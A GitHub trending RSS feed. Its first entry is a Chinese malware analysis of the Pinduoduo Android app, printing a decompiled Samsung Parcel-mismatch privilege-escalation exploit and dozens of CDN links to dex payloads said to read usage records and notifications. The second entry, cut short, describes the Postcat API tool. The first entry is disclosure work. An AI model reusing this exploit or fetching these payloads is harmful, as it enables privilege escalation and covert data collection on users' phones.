<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-03-11T01:29:21Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>davinci1010/pinduoduo_backdoor</title>
    <updated>2023-03-11T01:29:21Z</updated>
    <id>tag:github.com,2023-03-11:/davinci1010/pinduoduo_backdoor</id>
    <link href="https://github.com/davinci1010/pinduoduo_backdoor" rel="alternate"></link>
    <summary type="html">&lt;p&gt;拼多多apk内嵌提权代码，及动态下发dex分析&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;拼多多apk内嵌提权代码，及动态下发dex分析&lt;/h1&gt; &#xA;&lt;p&gt;参考「 深蓝洞察 」的文章：&lt;a href=&#34;https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw&#34;&gt;https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw&lt;/a&gt; （Bundle 风水 - Android Parcel 序列化与反序列化不匹配系列漏洞，实现 0day/Nday 攻击，从而绕过系统校验，获取系统级 StartAnyWhere 能力）&lt;/p&gt; &#xA;&lt;p&gt;复现流程如下：&lt;br&gt; 下载3月5日前更新的（6.50版本前）的拼多多apk，如6.49版本：&lt;br&gt; &lt;a href=&#34;https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728&#34;&gt;https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;解压apk文件，找到拼多多apk中，提权代码所在的文件位置：&lt;br&gt; pinduoduo-6-49-0.zip\assets\component\com.xunmeng.pinduoduo.AliveBaseAbility.7z\com.xunmeng.pinduoduo.AliveBaseAbility\vmp_src\mw1.bin&lt;/p&gt; &#xA;&lt;p&gt;以上是一个加VMP壳的dex文件，脱壳还原出代码，可以找到针对不同手机厂商系统的多个用于提权的漏洞利用代码，胆子相当的大，比如利用三星手机“com.samsung.android.cepproxyks.CertByte”的提权漏洞，代码如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;// assets/component/com.xunmeng.pinduoduo.AliveBaseAbilitiy&#xA;// [Manwei]&#xA;// com/xunmeng/pinduoduo/android_pull_ablity_comp/pullstartup/SamsungAlivePullStartup &#xA;&#xA;Public static Bundle makeBundleForSamsungSinceP(Intent intent){&#xA;   Bundle bundle = new Bundle();&#xA;   Parcel obtain = Parcel.obtain();&#xA;   Parcel obtain2 = Parcel.obtain();&#xA;   Parcel obtain3 = Parcel.obtain();&#xA;   obtain2.writeInt(3);&#xA;   obtain2.writeInt(13);&#xA;   obtain2.writeInt(72);&#xA;   obtain2.writeInt(3);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(4);&#xA;   obtain2.writeString(&#34;com.samsung.android.cepproxyks.CertByte&#34;);&#xA;   obtain2.writeInt(0);&#xA;   byte b[] = new byte[0];&#xA;   obtain2.writeByteArray(b);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(13);&#xA;   obtain2.writeInt(72);&#xA;   obtain2.writeInt(53);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(1);&#xA;   obtain2.writeInt(1);&#xA;   obtain2.writeInt(13);&#xA;   obtain2.writeInt(72);&#xA;   obtain2.writeInt(48);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(0);&#xA;   obtain2.writeInt(13);&#xA;   obtain2.writeInt(-1);&#xA;   int dataPosition = obtain2.dataPosition();&#xA;   obtain2.writeString(&#34;intent&#34;);&#xA;   obtain2.writeInt(4);&#xA;   obtain2.writeString(&#34;android.content.Intent&#34;);&#xA;   obtain2.writeToParcel(obtain3, 0);&#xA;   obtain2.appendFrom(obtain3, 0, obtain3.dataSize());&#xA;   int dataPosition2 = obtain2.dataPosition();&#xA;   obtain2.setDataPosition(dataPosition2 - 4);&#xA;   obtain2.writeInit(dataPosition2 -dataPosition);&#xA;   obtain2.setdataPosition(dataPosition2);&#xA;   int dataSize = obtain2.dataSize();&#xA;   obtain.writeInt(dataSize);&#xA;   obtain.writeInt(1279544898);&#xA;   obtain.appendFrom(obtain2, 0, dataSize);&#xA;   obtain.setDataPosition(0);&#xA;   bundle.readFromParcel(obtain);&#xA;   return bundle;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;提权后，就开始瞎搞了，动态下发dex，开始给自己保活，防卸载，然后搞数据，这部分代码比较通俗易懂， 比如：&lt;br&gt; 1a68d982e02fc22b464693a06f528fac.dex 读取用户手机上的app使用记录&lt;br&gt; 95cd95ab4d694ad8bdf49f07e3599fb3.dex 读取用户手机的应用通知，这一波各大公司app全灭了吧？&lt;/p&gt; &#xA;&lt;p&gt;自己去dex目录看吧。&lt;/p&gt; &#xA;&lt;p&gt;部分dex文件的下载地址（3月3日已被拼多多从CDN服务器上删除）：&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/4a72c6bb-337c-46c4-8c9c-637efafdd1c6.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/4a72c6bb-337c-46c4-8c9c-637efafdd1c6.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/61517b68-7c09-4021-9aaa-cdebeb9549f2.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/61517b68-7c09-4021-9aaa-cdebeb9549f2.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/78afc1cd-60da-482b-90e7-4d5e72a01266.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/78afc1cd-60da-482b-90e7-4d5e72a01266.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/f9b6b139-4516-4ac2-896d-8bc3eb1f2d03.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/f9b6b139-4516-4ac2-896d-8bc3eb1f2d03.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/6932a923-9f13-4624-bfea-1249ddfd5505.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/6932a923-9f13-4624-bfea-1249ddfd5505.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/7c6e6702-e461-4315-8631-eee246aeba95.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/7c6e6702-e461-4315-8631-eee246aeba95.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/8c34f5dc-f04c-40ba-98d4-7aa7c364b65c.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/8c34f5dc-f04c-40ba-98d4-7aa7c364b65c.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a3937709-b9cc-48fd-8918-163c9cb7c2df.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a3937709-b9cc-48fd-8918-163c9cb7c2df.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a4d4dccf-1f8c-48e3-acd5-92cdf156e585.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a4d4dccf-1f8c-48e3-acd5-92cdf156e585.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/e9ded9d4-1c94-47d0-8e8b-94aa773af81c.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/e9ded9d4-1c94-47d0-8e8b-94aa773af81c.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/4569a29c-b5a8-4dcf-a3a6-0a2f0bfdd493.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/4569a29c-b5a8-4dcf-a3a6-0a2f0bfdd493.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/538278f3-9f68-4fce-be10-12635b9640b2.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/538278f3-9f68-4fce-be10-12635b9640b2.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7ce6d296-a5bd-4718-9f79-543621ba5422.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7ce6d296-a5bd-4718-9f79-543621ba5422.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/e723d560-c2ee-461e-b2a1-96f85b614f2b.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/e723d560-c2ee-461e-b2a1-96f85b614f2b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/f0139a82-8bb6-4f3e-a81b-70200fc38eaa.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/f0139a82-8bb6-4f3e-a81b-70200fc38eaa.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/sdlog/218a37ea-710d-49cb-b872-2a47a1115c69.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/sdlog/218a37ea-710d-49cb-b872-2a47a1115c69.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/136d4651-df47-41b4-bb80-2ec0ab1bc775.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/136d4651-df47-41b4-bb80-2ec0ab1bc775.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/4f260398-e9d1-4390-bbb9-eeb49c07bf3c.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/4f260398-e9d1-4390-bbb9-eeb49c07bf3c.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/7dee63bd-ebad-4d74-a06f-90750aa18e18.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/7dee63bd-ebad-4d74-a06f-90750aa18e18.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/8b56d820-cac2-4ca0-8a3a-1083c5cca7ae.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/8b56d820-cac2-4ca0-8a3a-1083c5cca7ae.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/cdcbd06b-8a32-4645-b9fe-c186b548c34e.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/cdcbd06b-8a32-4645-b9fe-c186b548c34e.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/5d372522-b6a4-4c1b-a0b4-8114d342e6c0.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/5d372522-b6a4-4c1b-a0b4-8114d342e6c0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/74168acd-14b4-4ff8-842e-f92b794d7abf.dex&#34;&gt;https://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/74168acd-14b4-4ff8-842e-f92b794d7abf.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/1a68d982e02fc22b464693a06f528fac.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/1a68d982e02fc22b464693a06f528fac.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/561341f5f7976e13efce7491887f1306.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/561341f5f7976e13efce7491887f1306.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/6f9451e79a0a4b53aff86fe489dffd22.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/6f9451e79a0a4b53aff86fe489dffd22.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/98f10c20525142f9929b4f267b6ccf4d.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/98f10c20525142f9929b4f267b6ccf4d.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/d4b6d58467fb417380d53382b8adcfd6.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/d4b6d58467fb417380d53382b8adcfd6.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/f35735a5cbf445c785237797138d246a.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/f35735a5cbf445c785237797138d246a.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/td/2aa151e2cfa04acb8fb96e523807ca6b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/common/td/8aeb045fad9343acbbd1a26998b6485a.dex&#34;&gt;https://commfile.pddpic.com/sdfile/common/td/8aeb045fad9343acbbd1a26998b6485a.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/hw/da03be2689cc463f901806b5b417c9f5.dex&#34;&gt;https://commfile.pddpic.com/sdfile/hw/da03be2689cc463f901806b5b417c9f5.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/hw/perm/257682c986ab449ab9e7c8ae7682fa61.dex&#34;&gt;https://commfile.pddpic.com/sdfile/hw/perm/257682c986ab449ab9e7c8ae7682fa61.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/oppo/480ed5841ebf4b9c8900c19e700edbed.dex&#34;&gt;https://commfile.pddpic.com/sdfile/oppo/480ed5841ebf4b9c8900c19e700edbed.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/oppo/50679b0fc43a458dabac39730616fa9b.dex&#34;&gt;https://commfile.pddpic.com/sdfile/oppo/50679b0fc43a458dabac39730616fa9b.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/oppo/67c9e686004f45158e94002e8e781192.dex&#34;&gt;https://commfile.pddpic.com/sdfile/oppo/67c9e686004f45158e94002e8e781192.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/oppo/bbbfcfd4cc67499eac47f6e44a37b8a4.dex&#34;&gt;https://commfile.pddpic.com/sdfile/oppo/bbbfcfd4cc67499eac47f6e44a37b8a4.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/oppo/dc638f3e6fa84d56970d9a8ff4fc5295.dex&#34;&gt;https://commfile.pddpic.com/sdfile/oppo/dc638f3e6fa84d56970d9a8ff4fc5295.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/0bb624afe4b54063bfa3299d3afd9736.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/0bb624afe4b54063bfa3299d3afd9736.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/183bb87aa7d744a195741ce524577dd0.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/183bb87aa7d744a195741ce524577dd0.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/2eb20dc580aaa5186ee4a4ceb2374669.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/2eb20dc580aaa5186ee4a4ceb2374669.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/7877ec6850344e7aad5fdd57f6abf238.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/7877ec6850344e7aad5fdd57f6abf238.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/a093b2d4f28c47b186e61951cb14c781.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/a093b2d4f28c47b186e61951cb14c781.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/a840668f7567459b95869165cfcd13cb.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/a840668f7567459b95869165cfcd13cb.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/ab8ed4c3482c42a1b8baef558ee79deb.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/ab8ed4c3482c42a1b8baef558ee79deb.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/be7a2b643d7e8543f49994ffeb0ee0b6.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/be7a2b643d7e8543f49994ffeb0ee0b6.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/vivo/d643e0f9a68342bc8403a69e7ee877a7.dex&#34;&gt;https://commfile.pddpic.com/sdfile/vivo/d643e0f9a68342bc8403a69e7ee877a7.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/xm/0fc0e98ac2e54bc29401efaddfc8ad7f.dex&#34;&gt;https://commfile.pddpic.com/sdfile/xm/0fc0e98ac2e54bc29401efaddfc8ad7f.dex&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://commfile.pddpic.com/sdfile/xm/95cd95ab4d694ad8bdf49f07e3599fb3.dex&#34;&gt;https://commfile.pddpic.com/sdfile/xm/95cd95ab4d694ad8bdf49f07e3599fb3.dex&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Postcatlab/postcat</title>
    <updated>2023-03-11T01:29:21Z</updated>
    <id>tag:github.com,2023-03-11:/Postcatlab/postcat</id>
    <link href="https://github.com/Postcatlab/postcat" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Postcat 是一个可扩展的 API 工具平台。集合基础的 API 管理和测试功能，并且可以通过插件简化你的 API 开发工作，让你可以更快更好地创建 API。An extensible API tool.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Postcat API 客户端（Client）&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://data.eolinker.com/course/QbLMSaJ7f3dcd0b075a7031b31f8acb486e0a090f1bdc8d.jpeg&#34; alt=&#34;Postcat API Client&#34;&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Postcatlab/postcat/main/wiki/README.en.md&#34;&gt;English&lt;/a&gt; | &lt;span&gt;简体中文&lt;/span&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/Postcatlab/postcat&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/Postcatlab/postcat?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Postcatlab/postcat/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/Postcatlab/postcat?sanitize=true&#34; alt=&#34;Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Postcatlab/postcat/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/downloads/Postcatlab/postcat/total?sanitize=true&#34; alt=&#34;Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/W3uk39zJCR&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/chat-on%20discord-7289da.svg?sanitize=true&#34; alt=&#34;Chat&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;概述&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Postcat&lt;/strong&gt; 是一个强大的开源、免费的、跨平台（Windows、Mac、Linux、Browsers...）的 &lt;strong&gt;API 开发测试工具&lt;/strong&gt;，支持 REST、Websocket 等协议（即将支持 GraphQL、gRPC、TCP、UDP），帮助你加速完成 API 开发和测试工作。它非常适合中小团队及个人使用。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://data.eolink.com/ImGzhCi79d0beb5b8221670dffceb61bf642af1960d3881&#34; alt=&#34;Postcat UI&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;我们在保证 &lt;strong&gt;Postcat&lt;/strong&gt; 轻巧灵活的同时，还为它设计了一个强大的插件系统，让您可以一键使用插件来增强它的功能。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://data.eolink.com/22UMwcV01e087e3549edb91361f15a9ba8047e16d0d3f3f&#34; alt=&#34;Postcat Extensions&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;因此 &lt;strong&gt;Postcat&lt;/strong&gt; 理论上是一个拥有无限可能的 API 产品，可以从Logo 中看到，我们也形象地为它加上了一件披风，代表它的无限可能。&lt;/p&gt; &#xA;&lt;h2&gt;免登录在线使用或下载&lt;/h2&gt; 